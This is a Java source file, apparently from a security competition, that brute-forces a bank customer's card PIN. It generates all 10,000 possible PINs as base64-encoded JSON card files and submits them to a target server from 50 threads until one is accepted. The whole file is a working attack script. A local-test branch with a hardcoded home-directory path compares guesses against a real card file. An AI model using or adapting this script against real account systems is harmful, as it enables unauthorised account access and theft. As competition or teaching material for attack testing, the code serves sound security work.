package team11;

import commandserver.CommandServer;
import models.CardFileGuess;
import org.apache.commons.lang3.tuple.Pair;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Stream;

public class BruteForce {

    public static void bruteForce(CommandServer commandServer, String custAccountName) {
        Queue<CardFileGuess> queue = generateCardFiles(custAccountName)
            .map(b64Card -> new CardFileGuess(custAccountName + ".card", b64Card.getLeft(), b64Card.getRight()))
            .collect(Collectors.toCollection(ConcurrentLinkedQueue::new));
        AtomicBoolean found = new AtomicBoolean(false);
        AtomicInteger trials = new AtomicInteger(0);
        Semaphore semaphore = new Semaphore(0);
        List<Thread> threads = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            Thread thread = new Thread(() -> {
                CardFileGuess guess;
                while (!queue.isEmpty() && !found.get() && (guess = queue.poll()) != null) {
                    int trialsValue = trials.incrementAndGet();
                    if (trialsValue % 100 == 0) {
                        System.err.println("Bruteforce completion: " + (trialsValue / 10000.0));
                    }

                    boolean local = false;
                    if (local) {
                        try {
                            File targetFile = new File("/home/cbruegg/Downloads/11/build/ted.card");
                            byte[] bytes = Files.readAllBytes(targetFile.toPath());
                            byte[] guessBytes = Base64.getDecoder().decode(guess.getContent());
                            if (Arrays.equals(bytes, guessBytes)) {
                                found.set(true);
                                semaphore.release();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        if (commandServer.send(guess).isSuccess()) {
                            found.set(true);
                            semaphore.release();
                        }
                    }
                }
            });
            thread.start();
            threads.add(thread);
        }
        new Thread(() -> {
            for (Thread thread : threads) {
                try {
                    thread.join();
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
            // Also release if no match was found
            semaphore.release();
        }).start();
        try {
            semaphore.acquire();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        if (found.get()) {
            System.err.println("Found PIN!");
        } else {
            System.err.println("Did not find PIN!");
        }
    }

    private static Stream<Pair<String, Integer>> generateCardFiles(String custAccountName) {
        return IntStream.rangeClosed(0, 9999)
            .mapToObj(pin -> Pair.of(generateCardFile(custAccountName, pin), pin));
    }

    private static String generateCardFile(String custAccountName, int pin) {
        JSONObject jsonOutput = new JSONObject();
        try {
            jsonOutput.put("account", custAccountName);
            jsonOutput.put("pin", String.valueOf(pin));
        } catch (JSONException e) {
            e.printStackTrace();
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        PrintWriter writeToFile = new PrintWriter(bos);
        writeToFile.println(jsonOutput.toString());
        writeToFile.close();
        byte[] bytes = bos.toByteArray();
        return Base64.getEncoder().encodeToString(bytes);
    }
}
